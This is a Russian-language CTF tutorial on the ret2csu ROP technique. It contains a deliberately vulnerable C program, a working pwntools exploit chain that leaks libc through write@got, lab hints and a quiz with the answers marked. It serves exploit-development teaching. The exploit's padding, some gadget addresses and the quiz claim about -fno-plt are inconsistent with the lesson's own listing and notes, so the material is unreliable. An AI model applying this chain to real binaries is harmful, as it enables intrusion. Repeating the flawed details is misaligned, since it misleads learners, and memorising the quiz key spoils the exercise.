---
id: pwn-ret2csu
title: "ret2csu: управление rdx/rsi через __libc_csu_init"
category: pwn
parent: pwn-rop-techniques
difficulty: hard
order: 2
tags: [ret2csu, rop, gadgets, libc-csu, rdx]
prerequisites: [pwn-rop, pwn-gadget-hunting]
useful_for:
  - "CTF Pwn категория"
  - "Построение ROP-цепочек"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Учимся выставлять третий аргумент (rdx) в ROP-цепочке через гаджеты из __libc_csu_init, когда в бинаре нет pop rdx; ret."
lab:
  kind: shell
  title: "Практика: gadget-цепочка __libc_csu_init"
  toolset: [core, objdump]
  workdir: /home/student/task
  files: [task.md, csu]
  check: "grep -q '0x401000' answer.txt"
  hints:
    - "Бинарник статический и без libc: `file csu`."
    - "Дизассемблируй: `objdump -d csu` — ищи метку `csu_gadget`."
    - "Классический CSU-гаджет начинается с `pop %rbx`: это адрес первого `pop`."
---

## Вопрос, с которого всё начинается

Ты собрал ROP-цепочку и хочешь утечь libc вызовом `write(1, write@got, 8)` — это три аргумента: куда, что и сколько. В уроке про ROP мы брали гаджет `pop rdi; ret` и клали аргумент в `rdi`. Но для третьего аргумента нужен `pop rdx; ret`, а его в бинаре... нет.

Ищем:

```bash
$ ROPgadget --binary ./chall | grep -E "pop rdx"
$
```

Пусто. Компилятор просто не породил этот гаджет — в маленьком бинаре он не понадобился. Неужели тупик?

## Наш пример: бинарь без pop rdx

```c
// chall.c — утечка через write, но гаджетов мало
#include <stdio.h>
#include <unistd.h>
int main(void) {
    char buf[64];
    write(1, "Input: ", 7);
    read(0, buf, 0x200);
    return 0;
}
```

```bash
$ gcc -fno-stack-protector -no-pie -o chall chall.c
$ ROPgadget --binary ./chall | grep -cE "pop rdx"
0
```

`pop rdi` есть, `pop rsi` можно найти, а `pop rdx` — нет. Сегодня научимся обходиться без него.

## Шаг 1. Идея: функция, которую компилятор добавляет всегда

Когда GCC линкует программу с glibc, он добавляет служебную функцию `__libc_csu_init` — она готовит аргументы `argc`/`argv` к `main`. В её хвосте компилятор оставляет «универсальную настройку регистров». Найдём её:

```bash
$ objdump -d -M intel ./chall | grep -A30 '<__libc_csu_init>:'
```

Типичный хвост выглядит так (адреса условны):

```asm
4011c0: mov    rdx, r14          <-- call-блок начинается тут
4011c3: mov    rsi, r13
4011c6: mov    edi, r12d
4011c9: call   QWORD PTR [r15+rbx*8]
4011cd: add    rbx, 1
4011d1: cmp    rbp, rbx
4011d4: jne    4011c0
4011d6: add    rsp, 8            <-- pop-блок начинается тут
4011db: pop    rbx
4011dc: pop    rbp
4011dd: pop    r12
4011df: pop    r13
4011e1: pop    r14
4011e3: pop    r15
4011e5: ret
```

Здесь два полезных фрагмента, их называют **гаджетами** (короткие кусочки кода, заканчивающиеся на `ret`).

**Pop-блок** (с `4011d6`) снимает со стека шесть значений в регистры `rbx`, `rbp`, `r12`, `r13`, `r14`, `r15` и делает `ret`.

**Call-блок** (с `4011c0`) переносит `r14 → rdx`, `r13 → rsi`, `r12d → edi` и вызывает функцию по адресу `[r15+rbx*8]`.

Идея: сначала pop-блоком заполним регистры, потом перейдём на call-блок — и получим вызов функции с тремя аргументами.

## Шаг 2. Как связать два блока

План:

1. Прыгнуть на **pop-блок**, положив на стек: `rbx=0`, `rbp=1`, `r12=edi`, `r13=rsi`, `r14=rdx`, `r15=<адрес ячейки с функцией>`. Затем `ret` уйдёт на call-блок.
2. **Call-блок** перенесёт `r14/r13/r12d` в аргументы и выполнит `call [r15+rbx*8]`. При `rbx=0` вызов идёт по адресу `[r15]`.

Если взять `r15 = elf.got['write']`, то `[r15]` — это реальный адрес `write` в libc (или, до первого вызова, адрес трамплина). В обоих случаях вызов сработает.

Осталась одна тонкость: после возврата из функции исполнение продолжается на `4011cd` — `add rbx,1; cmp rbp,rbx; jne 4011c0`. Чтобы **не зациклиться**, ставим `rbp=1`: тогда после `add` получится `rbx=1`, сравнение `rbp==rbx` истинно, цикл не повторяется.

И ещё: между call-блоком и pop-блоком стоит `add rsp, 8` — один «пропуск» на стеке, который надо учесть фиктивным значением.

## Шаг 3. Собираем цепочку

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72

csu_pop  = 0x4011da   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_call = 0x4011c0   # mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]

p = process('./chall')
rop  = p64(csu_pop)
rop += p64(0)                 # rbx = 0
rop += p64(1)                 # rbp = 1
rop += p64(1)                 # r12 -> edi = 1   (fd)
rop += p64(elf.got['write'])  # r13 -> rsi = что читать (адрес write@got)
rop += p64(8)                 # r14 -> rdx = сколько
rop += p64(elf.got['write'])  # r15 -> [r15] = адрес write
rop += p64(csu_call)
rop += p64(0)                 # пропуск под add rsp,8
rop += p64(0)*7               # rbx,rbp,r12,r13,r14,r15 для pop-блока после call
rop += p64(elf.symbols['main'])
p.sendline(flat({OFFSET: rop}))
leak = p.recv(8)
log.success(f'leak = {leak.hex()}')
```

```text
[+] leak = a03a2f0d7cf97f00
```

Мы получили 8 байт реального адреса `write` — утечку libc, не имея `pop rdx`. Дальше по утечке считаем базу libc, как в `pwn-ret2libc`.

## Шаг 4. Что происходит со стеком, шаг за шагом

Полезно видеть последовательность. Обозначим `P` — pop-блок, `C` — call-блок. Стек после переполнения:

```text
[P][rbx=0][rbp=1][r12][r13][r14][r15][C][gap8][...дальше...]
```

1. `ret` уходит на `P`; pop-блок снимает шесть значений и делает `ret` на `C`.
2. `C` выполняет `mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15]` — вызов `write`.
3. После возврата `rbp=1`, `rbx` стал 1, цикл не повторяется.
4. `add rsp,8` пропускает `gap8`, второй pop-блок снимает ещё шесть значений, `ret` возвращается туда, куда мы указали (`main` для второго раунда).

## Шаг 5. Тонкости, на которых ломается цепочка

- **Смещение pop-блока зависит от компилятора.** Не хардкодь `0x4011da` — найди адрес дизассемблером.
- **`mov edi, r12d` обнуляет старшие биты `rdi`.** Годится для малых чисел (fd=1), но не для 64-битных указателей.
- **`add rsp, 8` после call.** Забыть про пропуск — сдвинуть всю цепочку.
- **`rbp` должен стать равен `rbx+1`.** Иначе бесконечный цикл.
- **glibc 2.34+.** `__libc_csu_init` может отсутствовать — тогда иди в `pwn-ret2dlresolve`.
- **PIE.** Адреса csu-гаджетов пересчитываются от базы.

## Как найти адреса блоков надёжно

Адреса pop- и call-блока зависят от версии компилятора и флагов, поэтому их нельзя копировать из чужого эксплойта. Находи их так: открой `__libc_csu_init` в дизассемблере (`objdump -d -M intel ./chall | grep -A40 '<__libc_csu_init>:'`), затем найди последовательность шести `pop` подряд — её первый адрес и есть pop-блок. Call-блок начинается на инструкции `mov rdx, r14` чуть выше по адресу. В pwntools то же самое достаётся программно:

```python
>>> rop = ROP(elf)
>>> hex(rop.find_gadget(['pop rbx','pop rbp','pop r12','pop r13','pop r14','pop r15','ret']).address)
'0x4011da'
```

## На что смотреть дальше

- Если `pop rdi`/`pop rsi`/`pop rdx` **есть** — ret2csu не нужен, бери их напрямую.
- Если нет даже csu (например, `-fno-plt`) — используй `pwn-ret2dlresolve`.
- Если гаджетов совсем мало и есть `syscall` — смотри `pwn-seccomp-srop`.
- Всегда проверяй `ROPgadget --only 'pop|ret'` перед выбором техники.

## Что мы теперь знаем

- ret2csu достаёт «недостающие» гаджеты из `__libc_csu_init`.
- Pop-блок заполняет `rbx/rbp/r12-r15`, call-блок переносит их в аргументы.
- `r15` указывает на ячейку с адресом функции (`got`), `rbx=0`, `rbp=1`.
- Один «пропуск» (`add rsp,8`) обязателен.

## Квиз

Проверь себя.

```quiz
- question: "Из какой функции берутся гаджеты ret2csu?"
  options:
    - "__libc_csu_init"
    - "main"
    - "system"
    - "printf"
  answer: 0
  explanation: "Компилятор генерирует __libc_csu_init с удобными pop/mov-гаджетами."
- question: "Какие регистры выставляет call-блок из r12/r13/r14?"
  options:
    - "edi, rsi, rdx"
    - "rax, rbx, rcx"
    - "r8, r9, r10"
    - "rsp, rbp, rbx"
  answer: 0
  explanation: "mov rdx,r14; mov rsi,r13; mov edi,r12d — так выставляются аргументы."
- question: "Что делает `call qword ptr [r15 + rbx*8]`?"
  options:
    - "Косвенный вызов функции по указателю из памяти по r15"
    - "Возврат из функции"
    - "Загрузку rdi"
    - "Syscall"
  answer: 0
  explanation: "Косвенный call позволяет вызвать write/puts через GOT-запись."
- question: "Почему нужно выставить rbp = rbx + 1?"
  options:
    - "Чтобы цикл завершился после одной итерации"
    - "Чтобы включить ASLR"
    - "Чтобы снять canary"
    - "Чтобы расширить tcache"
  answer: 0
  explanation: "Условие cmp rbp,rbx; jne определяет число итераций."
- question: "Когда ret2csu неприменим?"
  options:
    - "Когда __libc_csu_init отсутствует (например, -fno-plt)"
    - "Когда NX выключен"
    - "Когда есть canary"
    - "Когда PIE выключен"
  answer: 0
  explanation: "Без сгенерированной csu-функции гаджеты недоступны."
```

## Куда дальше

В `pwn-stack-pivot` мы разберём, что делать, когда места на стеке не хватает даже для этой цепочки — и стек приходится переносить в `.bss`. А пока главное: **когда нет нужного `pop`-гаджета, `__libc_csu_init` даёт готовый набор регистров.**

## Где пригодится

- **CTF:** Pwn — ROP без `pop rdx`.
- **Bug bounty:** построение цепочек в бедных на гаджеты бинарях.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
